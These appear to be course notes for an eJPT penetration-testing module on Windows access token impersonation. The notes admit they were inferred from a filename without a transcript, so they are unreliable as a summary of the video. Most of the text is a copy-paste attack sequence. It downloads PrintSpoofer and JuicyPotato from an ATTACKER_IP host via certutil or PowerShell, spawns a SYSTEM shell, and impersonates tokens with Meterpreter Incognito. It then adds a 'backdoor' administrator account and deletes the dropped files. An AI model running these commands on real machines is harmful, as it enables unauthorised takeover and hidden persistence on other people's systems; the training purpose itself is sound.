# 06 - Access Token Impersonation (Windows Privilege Escalation)

Note: No transcript was provided. The following is a conservative, eJPT-oriented summary inferred from the filename and typical Windows privilege escalation workflows for access token impersonation.

## What the video covers (Introduction / big picture)
- Concept of Windows access tokens and how impersonation enables a lower-privileged context (often a service account) to execute as a higher-privileged user.
- Identifying key privileges (especially SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege) that enable token-based local privilege escalation.
- Two practical paths:
  - Using Meterpreter’s Incognito to list and impersonate available tokens.
  - Using standalone “potato-like” exploit tools (e.g., PrintSpoofer) to get a SYSTEM shell when SeImpersonatePrivilege is present.
- Verification and post-exploitation steps after impersonation (confirming identity, persistence).

## Flow (ordered)
1. Establish a foothold on the Windows target (low-privilege user or service account).
2. Enumerate current user, groups, and token privileges.
3. If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is present:
   - Prefer a modern tool such as PrintSpoofer to spawn a SYSTEM shell.
4. If you have a Meterpreter session:
   - Load Incognito, enumerate tokens, and impersonate a high-privilege token if available.
5. Validate escalation (whoami, whoami /priv).
6. Establish persistence or escalate to a stable SYSTEM/admin context.
7. Clean up any dropped binaries if necessary.

## Tools highlighted
- Built-in:
  - whoami /priv, whoami /user, whoami /groups
  - sc query Spooler (to check Print Spooler status)
- Metasploit/Meterpreter:
  - Incognito extension (list_tokens, impersonate_token)
  - getsystem (as a fallback)
- Third-party:
  - PrintSpoofer (SeImpersonatePrivilege → SYSTEM)
  - Optional: JuicyPotato/RoguePotato/SweetPotato/GodPotato (older/alternative techniques; may depend on OS and mitigations)

## Typical command walkthrough (detailed, copy-paste friendly)

### 1) Basic enumeration (target)
```cmd
whoami
whoami /priv
whoami /groups
whoami /all
```

Check if Print Spooler is running (helpful for PrintSpoofer):
```cmd
sc query Spooler
```

### 2) PrintSpoofer path (when SeImpersonatePrivilege is present)
Upload PrintSpoofer (choose one method):

PowerShell:
```powershell
powershell -c "Invoke-WebRequest -Uri http://ATTACKER_IP:8000/PrintSpoofer64.exe -OutFile C:\Windows\Temp\ps.exe"
```

Certutil:
```cmd
certutil -urlcache -f http://ATTACKER_IP:8000/PrintSpoofer64.exe C:\Windows\Temp\ps.exe
```

Run it to spawn a SYSTEM cmd:
```cmd
C:\Windows\Temp\ps.exe -i -c cmd.exe
```

Verify:
```cmd
whoami
whoami /priv
```

Establish persistence (optional):
```cmd
net user backdoor Passw0rd! /add
net localgroup administrators backdoor /add
```

### 3) Meterpreter Incognito path (if you already have a Meterpreter session)
In msfconsole:
```text
sessions -i 1
```

In the Meterpreter session:
```text
getuid
getprivs
load incognito
list_tokens -u
```

Impersonate a high-privilege token if present (replace DOMAIN\Administrator with what you see under Delegation Tokens or Impersonation Tokens):
```text
impersonate_token "DOMAIN\\Administrator"
getuid
```

Drop to a shell and verify:
```text
shell
whoami
whoami /priv
```

If needed, try getsystem (may work depending on context):
```text
getsystem
getuid
```

Persist (optional):
```cmd
net user backdoor Passw0rd! /add
net localgroup administrators backdoor /add
```

Revert impersonation if required:
```text
rev2self
```

### 4) (Optional) JuicyPotato-style approach (legacy/OS-dependent)
Note: Requires selecting a valid CLSID and often a listening port; may fail on newer Windows due to mitigations. Prefer PrintSpoofer where possible.

Upload JuicyPotato and run with a suitable CLSID:
```cmd
certutil -urlcache -f http://ATTACKER_IP:8000/JuicyPotato.exe C:\Windows\Temp\jp.exe
C:\Windows\Temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami" -t * -c {CLSID}
```

If successful, spawn SYSTEM shell:
```cmd
C:\Windows\Temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}
```

## Practical tips
- SeImpersonatePrivilege is common with service accounts (e.g., LOCAL SERVICE, NETWORK SERVICE). If present, PrintSpoofer is usually the most reliable and simplest path to SYSTEM.
- Use the 64-bit binary on 64-bit Windows. Mismatched architectures can cause failures.
- PrintSpoofer typically relies on the Print Spooler service; if it’s stopped/disabled, try alternative potatoes (e.g., RoguePotato) or other privesc vectors.
- In Meterpreter, tokens under “Delegation Tokens” are typically usable for network access; “Impersonation Tokens” may be local-only. Prefer delegation tokens for broader capability.
- After impersonation, verify with whoami and whoami /priv. If you need stability, create a new admin user or run a service as SYSTEM.
- OPSEC: Clean up dropped binaries and temporary files (e.g., C:\Windows\Temp\ps.exe).

## Minimal cheat sheet (one-screen flow)
- Enumerate:
```cmd
whoami & whoami /priv & whoami /groups
sc query Spooler
```
- If SeImpersonatePrivilege → PrintSpoofer:
```cmd
certutil -urlcache -f http://ATTACKER_IP:8000/PrintSpoofer64.exe C:\Windows\Temp\ps.exe
C:\Windows\Temp\ps.exe -i -c cmd.exe
whoami
```
- Meterpreter Incognito:
```text
load incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"
getuid
shell
whoami
```
- Persistence:
```cmd
net user backdoor Passw0rd! /add
net localgroup administrators backdoor /add
```
- Cleanup:
```cmd
del C:\Windows\Temp\ps.exe
```

## Summary
This module demonstrates Windows access token impersonation as a practical local privilege escalation technique. You enumerate token privileges first; if SeImpersonatePrivilege (or SeAssignPrimaryTokenPrivilege) is present, use PrintSpoofer to get a SYSTEM shell quickly. If operating within a Meterpreter session, the Incognito extension can list and impersonate tokens for local admin or SYSTEM context when available. Always verify escalation and, if required, establish persistence in a controlled, auditable manner.